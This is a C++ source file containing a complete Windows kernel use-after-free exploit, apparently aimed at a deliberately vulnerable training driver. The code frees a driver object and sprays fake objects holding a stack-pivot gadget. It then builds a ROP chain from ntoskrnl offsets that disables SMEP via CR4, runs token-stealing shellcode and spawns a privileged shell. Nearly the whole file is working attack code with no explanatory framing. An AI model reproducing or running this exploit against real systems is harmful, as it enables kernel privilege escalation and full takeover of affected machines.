#include "NonPagedPoolUaf.hpp"


VOID NonPagedPoolUafExploit()
{
	DWORD dwRet;
	BYTE uPayload[0x60] = { 0 };
	HANDLE hDevice = CreateFileW(
		TEXT(DEVICE_LINK_NAME),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		Error("open device");
	}

	wprintf(L"[*] Create UAF Object\r\n");
	DeviceIoControl(hDevice, IOCTL_NonPagedPool_ALLOC, NULL, 0, NULL, 0, &dwRet, NULL);
	//DebugBreak();

	wprintf(L"[*] Free UAF Object\r\n");
	DeviceIoControl(hDevice, IOCTL_NonPagedPool_FREE, NULL, 0, NULL, 0, &dwRet, NULL);

	wprintf(L"[*] Prepare shellcode\r\n");
	LPVOID pShellcode = VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(pShellcode, StealToken, 0x100);

	DWORD64 ntBase = GetModuleBase(TEXT("ntoskrnl.exe"));
	wprintf(L"nt base: %#llx\r\n", ntBase);
	getchar();

	// 0x00000000002f3f70: mov esp, 0x48000000; add esp, 0x28; ret;
	DWORD64 MOV_ESP_ADD_ESP = ntBase + 0x00000000002f3f70;
	// 0x00000000003a0a67: mov cr4, rcx; ret;
	DWORD64 MOV_CR4_RCX = ntBase + 0x00000000003a0a67;
	// 0x00000000002148c8: pop rcx; ret;
	DWORD64 POP_RCX_RET = ntBase + 0x00000000002148c8;
	DWORD64 STACK_PIVOT_ADDR = 0x48000000;
	DWORD64 stackAddr = STACK_PIVOT_ADDR - 0x1000;

	LPVOID pKernelStack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!VirtualLock(pKernelStack, 0x14000)) {
		Error("VirtualLock");
	}

	RtlFillMemory((LPVOID)STACK_PIVOT_ADDR, 0x28, '\x90');

	DWORD64* ROP = (DWORD64*)((DWORD64)STACK_PIVOT_ADDR + 0x28);
	DWORD index = 0;
	*(ROP + index++) = POP_RCX_RET;
	*(ROP + index++) = 0x350ef8 ^ (3UL << 20);
	*(ROP + index++) = MOV_CR4_RCX;
	*(ROP + index++) = (DWORD64)pShellcode;
	*(DWORD64*)(uPayload) = (DWORD64)(MOV_ESP_ADD_ESP);
	*(DWORD64*)(uPayload + 8) = (DWORD64)(0xdeadbeef);
	*(DWORD64*)(uPayload + 0x10) = (DWORD64)(0xdeadbeef);

	printf("[*] Spray to get the UAF object then write shellcode\r\n");
	for (int i = 0; i < SPRAY_NUM; i ++)
	{
		DeviceIoControl(hDevice, IOCTL_NonPagedPool_ALLOC_FAKE, uPayload, sizeof(uPayload), NULL, 0, &dwRet, NULL);
	}

	printf("[*] Trigger UAF callback\r\n");
	DeviceIoControl(hDevice, IOCTL_NonPagedPool_USE, NULL, 0, NULL, 0, &dwRet, NULL);

	//system("cmd.exe");
	SpawnShell();
	CloseHandle(hDevice);
	VirtualFree(pKernelStack, 0, MEM_RELEASE);
	VirtualFree(pShellcode, 0, MEM_RELEASE);
}

